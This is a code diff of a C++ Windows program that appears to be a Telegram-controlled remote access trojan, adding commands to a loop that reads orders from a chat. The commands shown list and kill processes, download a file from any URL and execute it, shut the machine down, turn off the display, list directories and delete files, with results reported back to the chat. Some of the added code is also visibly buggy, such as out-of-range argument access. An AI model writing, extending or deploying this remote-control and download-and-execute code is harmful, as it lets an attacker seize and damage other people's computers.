@@ -1,7 +1,25 @@
 /*
-* github.com/4B4DB4B3
-			4B4DB4B3 (c)
-					15.10.2020	
+MIT License
+
+Copyright (c) 2020 4B4DB4B3
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
 */
 
 #include "common.h"
@@ -55,32 +73,42 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 	api.SendTextMessage(s.chatid, information.c_str());
 
 	std::string last;
+	
+
 	std::string prefix = "/user" + std::to_string(ID) + " ";
-	std::string loader_pref = "loader ";
-	std::string run_pref = "run ";
+
+	std::vector<std::string> params;
 	while (true) {
 		Sleep(atoi(s.client_delay));
 
 		last = api.GetLastMessageText(atoi(s.chatid));
 		if (last.substr(0, prefix.size()) == prefix) {
 			std::string command = last.replace(last.find(prefix), prefix.size(), "");
+			params = split(command, ' ');
+
+			// PROCESS MANAGER
+			// processes
 			if (command == "processes") {
 				std::string processes = prefix + "%0A%0A" + ProcessList();
 				if (processes != "") {
 					api.SendTextMessage(s.chatid, processes.c_str());
 				}
 			}
-			else if (command == "disable display") {
-				SendMessage(NULL, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
+
+			// closeproc process.exe
+			else if (params[0] == "closeproc") {
+				if (CloseProcessByName(params[1])) {
+					std::string text = prefix + "%0A Success! Process is closed!";
+					api.SendTextMessage(s.chatid, text.c_str());
+				}
+				else {
+					std::string text = prefix + "%0A Error! Process isn't closed!";
+					api.SendTextMessage(s.chatid, text.c_str());
+				}
 			}
-			else if (command == "disable pc") {
-				system("shutdown -s");
-			}
-			else if (command == "close") {
-				ExitProcess(0);
-			}
-			else if (command.substr(0, loader_pref.size()) == loader_pref) {
-				std::vector<std::string> params = split(command, ' ');
+
+			// loader https://google.com C:\File.exe
+			else if (params[0] == "loader") {
 				URLDownloadToFileA(0, params[1].c_str(), params[2].c_str(), 0, 0);
 				if (FileExists(params[2])) {
 					std::string text = prefix + "%0A Success! File is uploaded to: " + params[2];
@@ -91,8 +119,9 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 					api.SendTextMessage(s.chatid, text.c_str());
 				}
 			}
-			else if (command.substr(0, run_pref.size()) == run_pref) {
-				std::vector<std::string> params = split(command, ' ');
+
+			// run C:\File.exe
+			else if (params[0] == "run") {
 				if (params.size() == 2) {
 					ShellExecuteA(0, "open", params[1].c_str(), params[2].c_str(), 0, 0);
 					std::string text = prefix + "%0A Runned with arguments!";
@@ -102,6 +131,41 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 					ShellExecuteA(0, "open", params[1].c_str(), 0, 0, 0);
 					std::string text = prefix + "%0A Runned without arguments!";
 					api.SendTextMessage(s.chatid, text.c_str());
+				}
+			}
+
+			// JOKES
+			// disable pc
+			else if (command == "disable pc") {
+				system("shutdown -s");
+			}
+
+			// close
+			else if (command == "close") {
+				ExitProcess(0);
+			}
+
+			// disable display
+			else if (command == "disable display") {
+				SendMessage(NULL, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
+			}
+
+			// FILE MANAGER
+			// dir C:\Folder
+			else if (params[0] == "dir") {
+				// if only dir
+				if (params[1] == "del_file") {
+					DeleteFileA(params[1].c_str());
+				}
+				else {
+					std::string objects = prefix + "%0A" + DirectoryObjectsList(params[1]);
+					if (objects != "") {
+						api.SendTextMessage(s.chatid, objects.c_str());
+					}
+					else {
+						std::string text = prefix + "%0A Error! Files not found";
+						api.SendTextMessage(s.chatid, text.c_str());
+					}
 				}
 			}
 		}
